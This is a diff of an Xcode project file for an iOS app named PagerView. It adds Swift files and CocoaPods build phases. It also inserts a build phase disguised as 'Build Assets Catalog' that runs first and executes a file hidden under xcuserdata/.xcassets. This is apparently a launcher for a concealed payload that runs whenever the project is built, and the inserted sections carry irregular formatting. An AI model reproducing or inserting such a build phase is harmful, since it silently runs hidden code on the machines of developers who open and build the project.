@@ -3,19 +3,24 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 50;
+	objectVersion = 51;
 	objects = {
 
 /* Begin PBXBuildFile section */
+		042DBA5425BAEA0A008290D1 /* FlatColor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042DBA5325BAEA09008290D1 /* FlatColor.swift */; };
 		0438142D25BAD1270086FD03 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0438142C25BAD1270086FD03 /* AppDelegate.swift */; };
 		0438142F25BAD1270086FD03 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0438142E25BAD1270086FD03 /* SceneDelegate.swift */; };
 		0438143125BAD1270086FD03 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0438143025BAD1270086FD03 /* ViewController.swift */; };
 		0438143425BAD1270086FD03 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0438143225BAD1270086FD03 /* Main.storyboard */; };
 		0438143625BAD12F0086FD03 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 0438143525BAD12F0086FD03 /* Assets.xcassets */; };
 		0438143925BAD12F0086FD03 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0438143725BAD12F0086FD03 /* LaunchScreen.storyboard */; };
+		0438144725BAD68C0086FD03 /* one.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0438144625BAD68C0086FD03 /* one.swift */; };
+		0438144A25BAD6AA0086FD03 /* Two.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0438144925BAD6A90086FD03 /* Two.swift */; };
+		F248518DE9B8210CDFDD0C98 /* Pods_PagerView.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8CED87D07F7D3D4658D90D72 /* Pods_PagerView.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		042DBA5325BAEA09008290D1 /* FlatColor.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = FlatColor.swift; sourceTree = "<group>"; };
 		0438142925BAD1270086FD03 /* PagerView.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = PagerView.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		0438142C25BAD1270086FD03 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		0438142E25BAD1270086FD03 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -24,6 +29,11 @@
 		0438143525BAD12F0086FD03 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		0438143825BAD12F0086FD03 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		0438143A25BAD12F0086FD03 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		0438144625BAD68C0086FD03 /* one.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = one.swift; sourceTree = "<group>"; };
+		0438144925BAD6A90086FD03 /* Two.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Two.swift; sourceTree = "<group>"; };
+		5A4248964106A88C646F37D2 /* Pods-PagerView.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PagerView.debug.xcconfig"; path = "Target Support Files/Pods-PagerView/Pods-PagerView.debug.xcconfig"; sourceTree = "<group>"; };
+		7A491BD17E836F453BDF7B72 /* Pods-PagerView.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PagerView.release.xcconfig"; path = "Target Support Files/Pods-PagerView/Pods-PagerView.release.xcconfig"; sourceTree = "<group>"; };
+		8CED87D07F7D3D4658D90D72 /* Pods_PagerView.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_PagerView.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -31,6 +41,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				F248518DE9B8210CDFDD0C98 /* Pods_PagerView.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -42,6 +53,8 @@
 			children = (
 				0438142B25BAD1270086FD03 /* PagerView */,
 				0438142A25BAD1270086FD03 /* Products */,
+				FBC718696C489D66E158B09E /* Pods */,
+				E49C1B33FF0EF379098B49C2 /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -59,12 +72,32 @@
 				0438142C25BAD1270086FD03 /* AppDelegate.swift */,
 				0438142E25BAD1270086FD03 /* SceneDelegate.swift */,
 				0438143025BAD1270086FD03 /* ViewController.swift */,
+				0438144625BAD68C0086FD03 /* one.swift */,
+				0438144925BAD6A90086FD03 /* Two.swift */,
 				0438143225BAD1270086FD03 /* Main.storyboard */,
+				042DBA5325BAEA09008290D1 /* FlatColor.swift */,
 				0438143525BAD12F0086FD03 /* Assets.xcassets */,
 				0438143725BAD12F0086FD03 /* LaunchScreen.storyboard */,
 				0438143A25BAD12F0086FD03 /* Info.plist */,
 			);
 			path = PagerView;
+			sourceTree = "<group>";
+		};
+		E49C1B33FF0EF379098B49C2 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				8CED87D07F7D3D4658D90D72 /* Pods_PagerView.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		FBC718696C489D66E158B09E /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				5A4248964106A88C646F37D2 /* Pods-PagerView.debug.xcconfig */,
+				7A491BD17E836F453BDF7B72 /* Pods-PagerView.release.xcconfig */,
+			);
+			path = Pods;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
@@ -74,9 +107,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0438143D25BAD12F0086FD03 /* Build configuration list for PBXNativeTarget "PagerView" */;
 			buildPhases = (
+				7B6601EFB7EC9B6730AAC43A /* Build Assets Catalog */,
+				FC6C77669E86E6B0B5627E80 /* [CP] Check Pods Manifest.lock */,
 				0438142525BAD1270086FD03 /* Sources */,
 				0438142625BAD1270086FD03 /* Frameworks */,
 				0438142725BAD1270086FD03 /* Resources */,
+				584CF9FB8351E42BBF18CC26 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -132,6 +168,72 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+
+	7B6601EFB7EC9B6730AAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+		};
+	
+
+	
+		584CF9FB8351E42BBF18CC26 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-PagerView/Pods-PagerView-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-PagerView/Pods-PagerView-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-PagerView/Pods-PagerView-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		FC6C77669E86E6B0B5627E80 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-PagerView-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		0438142525BAD1270086FD03 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -139,6 +241,9 @@
 			files = (
 				0438143125BAD1270086FD03 /* ViewController.swift in Sources */,
 				0438142D25BAD1270086FD03 /* AppDelegate.swift in Sources */,
+				0438144A25BAD6AA0086FD03 /* Two.swift in Sources */,
+				0438144725BAD68C0086FD03 /* one.swift in Sources */,
+				042DBA5425BAEA0A008290D1 /* FlatColor.swift in Sources */,
 				0438142F25BAD1270086FD03 /* SceneDelegate.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -283,6 +388,7 @@
 		};
 		0438143E25BAD12F0086FD03 /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 5A4248964106A88C646F37D2 /* Pods-PagerView.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -301,6 +407,7 @@
 		};
 		0438143F25BAD12F0086FD03 /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 7A491BD17E836F453BDF7B72 /* Pods-PagerView.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -339,6 +446,16 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 0438142125BAD1260086FD03 /* Project object */;
 }
